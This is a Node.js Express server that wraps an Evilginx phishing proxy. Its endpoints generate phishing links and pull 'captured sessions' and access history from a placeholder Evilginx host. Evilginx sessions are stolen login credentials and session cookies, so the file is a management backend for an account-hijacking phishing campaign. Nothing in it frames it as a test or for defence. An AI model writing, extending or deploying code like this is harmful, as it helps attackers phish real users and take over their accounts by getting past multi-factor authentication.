const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// Evilginx Base URL
const EVILGINX_BASE_URL = 'http://your-evilginx-server.com/api/v1';

// Generate Link
app.post('/generate-link', async (req, res) => {
    try {
        const response = await axios.post(`${EVILGINX_BASE_URL}/generate-link`, req.body);
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to generate link' });
    }
});

// Fetch Captured Sessions
app.get('/captured-sessions', async (req, res) => {
    try {
        const response = await axios.get(`${EVILGINX_BASE_URL}/sessions`);
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch captured sessions' });
    }
});

// Fetch Access History
app.get('/access-history', async (req, res) => {
    try {
        const response = await axios.get(`${EVILGINX_BASE_URL}/access-history`);
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch access history' });
    }
});

const PORT = 5000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
